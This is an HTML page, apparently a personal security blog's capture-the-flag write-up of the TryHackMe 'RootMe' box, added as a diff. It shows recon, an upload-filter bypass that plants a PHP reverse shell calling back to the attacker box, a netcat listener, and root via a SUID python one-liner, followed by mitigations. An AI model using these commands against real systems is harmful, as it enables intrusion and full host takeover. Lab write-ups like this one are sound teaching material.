@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RootMe — Write-up · Nacht</title>
+  <meta name="description" content="Penetration test write-up for RootMe on TryHackMe — upload-filter bypass to a reverse shell, and privilege escalation via a SUID Python binary." />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            ink: '#0a0e12', surface: '#12171d', surface2: '#161c23',
+            line: '#232b34', mute: '#8b97a3', soft: '#b8c2cc',
+            bright: '#e6edf3', accent: '#3fe07f',
+          },
+          fontFamily: {
+            display: ['"Space Grotesk"', 'system-ui', 'sans-serif'],
+            body: ['"IBM Plex Sans"', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background-color: #0a0e12; }
+
+    .codeblock { border: 1px solid #232b34; border-radius: 10px; overflow: hidden; background: #0d1319; }
+    .codeblock__bar {
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid #232b34; padding: .5rem .9rem;
+      font-family: "JetBrains Mono", monospace; font-size: 11px; color: #8b97a3;
+    }
+    .codeblock pre { margin: 0; padding: 1rem .9rem; overflow-x: auto; }
+    .codeblock code {
+      font-family: "JetBrains Mono", monospace; font-size: 13px; line-height: 1.7; color: #b8c2cc;
+      white-space: pre;
+    }
+    .codeblock .cmd { color: #3fe07f; }
+    .codeblock .out { color: #8b97a3; }
+    .codeblock .cmt { color: #5c6b78; }
+
+    .redact {
+      font-family: "JetBrains Mono", monospace; font-size: 12px;
+      background: #1c2530; color: #6c7a86; padding: .1rem .5rem; border-radius: 4px;
+      border: 1px solid #2c3a45;
+    }
+
+    a:focus-visible { outline: 2px solid #3fe07f; outline-offset: 3px; border-radius: 4px; }
+    @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  </style>
+</head>
+
+<body class="bg-ink font-body text-soft antialiased selection:bg-accent/25 selection:text-bright">
+
+  <!-- ─── NAV ─────────────────────────────────────────────── -->
+  <header class="sticky top-0 z-50 border-b border-line/70 bg-ink/80 backdrop-blur">
+    <nav class="mx-auto flex max-w-3xl items-center justify-between px-5 py-4">
+      <a href="index.html" class="font-mono text-sm text-bright">
+        <span class="text-accent">nacht</span><span class="text-mute">@sec:~$</span>
+      </a>
+      <a href="index.html#writeups" class="font-mono text-[13px] text-mute transition-colors hover:text-accent">← back to write-ups</a>
+    </nav>
+  </header>
+
+  <article class="mx-auto max-w-3xl px-5 py-14">
+
+    <!-- ─── HEADER ────────────────────────────────────────── -->
+    <p class="font-mono text-[13px] text-accent">$ cat ./writeups/rootme.md</p>
+    <h1 class="mt-3 font-display text-4xl font-bold text-bright sm:text-5xl">RootMe</h1>
+
+    <div class="mt-5 flex flex-wrap items-center gap-3 font-mono text-[12px]">
+      <span class="rounded bg-surface2 px-2.5 py-1 text-mute">TryHackMe</span>
+      <span class="rounded bg-surface2 px-2.5 py-1 text-mute">difficulty: easy</span>
+      <span class="rounded bg-surface2 px-2.5 py-1 text-mute">web · linux</span>
+      <span class="rounded bg-surface2 px-2.5 py-1 text-mute">file upload · SUID</span>
+    </div>
+
+    <!-- ─── OBJECTIVE ─────────────────────────────────────── -->
+    <section class="mt-12">
+      <p class="mb-2 font-mono text-[13px] text-accent">$ ./objective</p>
+      <h2 class="font-display text-2xl font-semibold text-bright">Objective</h2>
+      <p class="mt-4 leading-relaxed text-soft">
+        A single Linux web host running Apache with a file-upload feature. The goal was full compromise —
+        recover the user and root flags. The path ran through an upload panel with a weak extension filter
+        (bypassed to plant a PHP reverse shell) and finished on a classic SUID-interpreter privilege
+        escalation. Two textbook bugs, chained end to end.
+      </p>
+    </section>
+
+    <!-- ─── TOOLS USED ────────────────────────────────────── -->
+    <section class="mt-12">
+      <p class="mb-2 font-mono text-[13px] text-accent">$ ls ./tools</p>
+      <h2 class="font-display text-2xl font-semibold text-bright">Tools Used</h2>
+      <div class="mt-4 flex flex-wrap gap-2 font-mono text-[12px] text-soft">
+        <span class="rounded border border-line px-2.5 py-1">Nmap</span>
+        <span class="rounded border border-line px-2.5 py-1">Gobuster</span>
+        <span class="rounded border border-line px-2.5 py-1">Netcat</span>
+        <span class="rounded border border-line px-2.5 py-1">php-reverse-shell</span>
+        <span class="rounded border border-line px-2.5 py-1">Python</span>
+        <span class="rounded border border-line px-2.5 py-1">find / GTFOBins</span>
+      </div>
+    </section>
+
+    <!-- ─── METHODOLOGY ───────────────────────────────────── -->
+    <section class="mt-12">
+      <p class="mb-2 font-mono text-[13px] text-accent">$ ./methodology --verbose</p>
+      <h2 class="font-display text-2xl font-semibold text-bright">Methodology</h2>
+
+      <!-- Phase 1 -->
+      <h3 class="mt-8 font-display text-lg font-semibold text-bright">01 · Reconnaissance</h3>
+      <p class="mt-3 leading-relaxed text-soft">
+        Standard service scan, output saved for reference. SSH and an Apache web server were exposed —
+        the web app was the obvious entry point.
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>terminal</span><span>nmap</span></div>
+        <pre><code><span class="cmd">$ nmap -sV -sC -oN initial_scan.txt &lt;TARGET_IP&gt;</span>
+<span class="out">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH (Ubuntu)
+80/tcp open  http    Apache httpd</span></code></pre>
+      </div>
+
+      <!-- Phase 2 -->
+      <h3 class="mt-10 font-display text-lg font-semibold text-bright">02 · Web Enumeration</h3>
+      <p class="mt-3 leading-relaxed text-soft">
+        Directory brute-forcing against the Apache root surfaced two paths that matter: an upload
+        <span class="font-mono text-[13px]">/panel</span> and the <span class="font-mono text-[13px]">/uploads</span> directory
+        where submitted files land. Together those are an upload-to-RCE waiting to happen.
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>terminal</span><span>gobuster</span></div>
+        <pre><code><span class="cmd">$ gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt</span>
+<span class="out">/index.php       (Status: 200)
+/css             (Status: 301)
+/js              (Status: 301)
+/panel           (Status: 301)   → upload form
+/uploads         (Status: 301)   → where uploads are served</span>
+<span class="cmt"># .htaccess / .htpasswd / server-status all 403 — no leverage there</span></code></pre>
+      </div>
+
+      <!-- Phase 3 -->
+      <h3 class="mt-10 font-display text-lg font-semibold text-bright">03 · Exploitation — upload bypass to reverse shell</h3>
+      <p class="mt-3 leading-relaxed text-soft">
+        The <span class="font-mono text-[13px]">/panel</span> upload form filters by file extension, and
+        <span class="font-mono text-[13px]">.php</span> is rejected. But the filter is a blocklist, and Apache is happy to
+        execute other PHP extensions — so renaming the payload to <span class="font-mono text-[13px]">.phtml</span> slipped
+        straight past it. I took the standard PHP reverse shell, set the callback to my attack-box IP and port, and saved it:
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>terminal</span><span>payload prep</span></div>
+        <pre><code><span class="cmd">$ cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml</span>
+<span class="cmt"># edit shell.phtml: set $ip to your attack-box IP (hostname -I), $port = 1234</span>
+<span class="cmd">$ hostname -I</span>
+<span class="out">10.x.x.x ...</span></code></pre>
+      </div>
+      <p class="mt-4 leading-relaxed text-soft">
+        Listener up first, then upload via <span class="font-mono text-[13px]">/panel</span> and trigger execution by browsing
+        to the file in <span class="font-mono text-[13px]">/uploads</span>:
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>attack box</span><span>netcat</span></div>
+        <pre><code><span class="cmd">$ nc -lvnp 1234</span>
+<span class="cmt"># then browse to: http://&lt;TARGET_IP&gt;/uploads/shell.phtml</span>
+<span class="out">Listening on 0.0.0.0 1234
+Connection received on &lt;TARGET_IP&gt; 32770
+Linux ip-... 5.15.0-generic x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$</span></code></pre>
+      </div>
+      <p class="mt-4 leading-relaxed text-soft">
+        Foothold as <span class="font-mono text-[13px]">www-data</span>. The dumb shell is painful to work in, so I upgraded it
+        to a proper TTY before going further — this makes tab-completion, arrow keys, and interactive commands behave:
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>reverse shell</span><span>stabilize</span></div>
+        <pre><code><span class="cmd">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+      </div>
+      <p class="mt-4 leading-relaxed text-soft">
+        From here the <strong class="text-bright">user flag</strong> was readable in the web user's reachable directories:
+        <span class="redact">redacted</span>.
+      </p>
+
+      <!-- Phase 4 -->
+      <h3 class="mt-10 font-display text-lg font-semibold text-bright">04 · Privilege Escalation — SUID Python</h3>
+      <p class="mt-3 leading-relaxed text-soft">
+        With a stable shell, I hunted for SUID binaries — files that run with their owner's privileges (root) regardless
+        of who executes them. A SUID bit on an interpreter is a instant win, because an interpreter can spawn a shell.
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>www-data shell</span><span>SUID hunt</span></div>
+        <pre><code><span class="cmd">$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</span>
+<span class="out">...
+-rwsr-xr-x 1 root root  /usr/bin/python   ← SUID on an interpreter
+...</span></code></pre>
+      </div>
+      <p class="mt-4 leading-relaxed text-soft">
+        A SUID <span class="font-mono text-[13px]">python</span> is listed on GTFOBins for exactly this. The
+        <span class="font-mono text-[13px]">-p</span> flag on the spawned shell is the key — it stops the shell from dropping
+        the elevated privileges, so I land as root rather than back at <span class="font-mono text-[13px]">www-data</span>:
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>www-data shell</span><span>GTFOBins</span></div>
+        <pre><code><span class="cmd">$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</span>
+<span class="cmd"># whoami</span>
+<span class="out">root</span></code></pre>
+      </div>
+      <p class="mt-4 leading-relaxed text-soft">
+        Root shell confirmed. The <strong class="text-bright">root flag</strong> was in root's home — box fully compromised:
+        <span class="redact">redacted</span>.
+      </p>
+      <div class="codeblock mt-4">
+        <div class="codeblock__bar"><span>root shell</span><span>/root</span></div>
+        <pre><code><span class="cmd"># ls -la /root</span>
+<span class="out">-rw-r--r-- 1 root root  26  root.txt</span>
+<span class="cmd"># less /root/root.txt</span></code></pre>
+      </div>
+    </section>
+
+    <!-- ─── MITIGATION ────────────────────────────────────── -->
+    <section class="mt-12">
+      <p class="mb-2 font-mono text-[13px] text-accent">$ ./mitigation</p>
+      <h2 class="font-display text-2xl font-semibold text-bright">Mitigation</h2>
+      <p class="mt-4 leading-relaxed text-soft">
+        Each stage maps to a concrete fix. In priority order:
+      </p>
+      <ul class="mt-4 space-y-3 text-soft">
+        <li class="flex gap-3"><span class="mt-1 text-accent">▹</span><span>
+          <strong class="text-bright">Never set the SUID bit on interpreters</strong> (<span class="font-mono text-[13px]">python</span>,
+          <span class="font-mono text-[13px]">perl</span>, <span class="font-mono text-[13px]">bash</span>, etc.). It converts any
+          low-priv foothold into root. Audit SUID binaries regularly (<span class="font-mono text-[13px]">find / -perm -4000</span>) and
+          strip the bit from anything that doesn't strictly need it.
+        </span></li>
+        <li class="flex gap-3"><span class="mt-1 text-accent">▹</span><span>
+          <strong class="text-bright">Validate uploads with an allowlist, and never execute the upload directory.</strong>
+          Blocklisting <span class="font-mono text-[13px]">.php</span> misses <span class="font-mono text-[13px]">.phtml</span>,
+          <span class="font-mono text-[13px]">.php5</span>, <span class="font-mono text-[13px]">.phar</span>, and more. Allow only known-good
+          types, verify content (not just extension), store uploads outside the web root, randomize filenames, and disable script
+          execution in <span class="font-mono text-[13px]">/uploads</span> (no PHP handler there).
+        </span></li>
+        <li class="flex gap-3"><span class="mt-1 text-accent">▹</span><span>
+          <strong class="text-bright">Authenticate the upload panel.</strong> <span class="font-mono text-[13px]">/panel</span> was
+          reachable without credentials — an anonymous file-upload endpoint is an open door.
+        </span></li>
+        <li class="flex gap-3"><span class="mt-1 text-accent">▹</span><span>
+          <strong class="text-bright">Run the web service least-privileged and add egress controls.</strong> An outbound firewall rule
+          would have blocked the reverse-shell callback, and monitoring on the uploads directory would have flagged the planted file.
+        </span></li>
+      </ul>
+    </section>
+
+    <!-- ─── TAKEAWAY ──────────────────────────────────────── -->
+    <section class="mt-12">
+      <p class="mb-2 font-mono text-[13px] text-accent">$ ./takeaway</p>
+      <h2 class="font-display text-2xl font-semibold text-bright">Takeaway</h2>
+      <p class="mt-4 leading-relaxed text-soft">
+        The two most common web-to-root paths in one box: an upload filter that blocklists instead of allowlists, and a
+        SUID bit left on an interpreter. Neither is subtle, and both show up constantly in real environments — which is
+        exactly why they're worth being fast and methodical about. Recon → foothold → stabilize → enumerate SUID → GTFOBins
+        is a repeatable playbook, not a lucky guess.
+      </p>
+    </section>
+
+    <!-- ─── FOOTER NAV ────────────────────────────────────── -->
+    <div class="mt-16 border-t border-line/60 pt-8">
+      <a href="index.html#writeups" class="font-mono text-[13px] text-accent hover:underline">← back to all write-ups</a>
+      <p class="mt-6 font-mono text-xs text-mute">© <span id="year"></span> Nacht</p>
+    </div>
+
+  </article>
+
+  <script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
